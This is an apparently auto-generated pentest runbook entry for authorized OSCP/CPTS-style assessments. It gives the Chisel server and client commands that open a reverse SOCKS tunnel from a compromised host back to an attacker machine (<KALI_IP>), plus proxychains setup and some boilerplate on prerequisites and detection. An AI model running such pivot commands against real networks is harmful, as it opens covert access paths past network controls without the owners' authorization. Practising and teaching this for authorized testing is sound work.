title: Chisel Reverse SOCKS Pivot
description: This runbook operationalizes Chisel Reverse SOCKS Pivot using #chisel , #update . It is designed for repeatable, high-signal execution in authorized OSCP/CPTS-style assessments. Establishes reverse SOCKS pivoting from compromised host to attacker infrastructure.

metadata.descriptionHtml:
This runbook operationalizes Chisel Reverse SOCKS Pivot using #chisel , #update. It is designed for repeatable, high-signal execution in authorized OSCP/CPTS-style assessments.

Establishes reverse SOCKS pivoting from compromised host to attacker infrastructure.

  1. Prepare scope and access: validate target reachability and select low-noise execution order.
  2. Execute core workflow: run the command chain to produce actionable security outcomes.
  3. Validate and operationalize output: confirm results, capture artifacts, and prepare follow-on actions.
  • Tool Location/Source: primary references are in local source corpus entries linked from runbook-list.md; e.g., docs/sources-runbooks/oscp-cpts/p0/n0xturne-OSCP-Cheat-Sheet-2024/README.md:1529; docs/sources-runbooks/oscp-cpts/p0/n0xturne-OSCP-Cheat-Sheet-2024/README.md:1534.
  • Attack pre-requisite: authorized scope, operator shell access, and protocol reachability on TCP 80, TCP 443.
  • What attacker gain: validated findings (access paths, credentials, execution context, or exposure evidence) enabling faster compromise progression.
  • Detection/Defense opsec: monitor abnormal auth/enumeration bursts, enforce least privilege and hardening baselines, and alert on repeated tool-pattern telemetry.

Core Commands:

chisel server -p 8001 --reverse
.\chisel.exe client <KALI_IP>:8001 R:1080:socks
# update /etc/proxychains4.conf to use local 1080
metadata.commandsBlock:
chisel server -p 8001 --reverse
./chisel.exe client <KALI_IP>:8001 R:1080:socks
# update /etc/proxychains4.conf to use local 1080
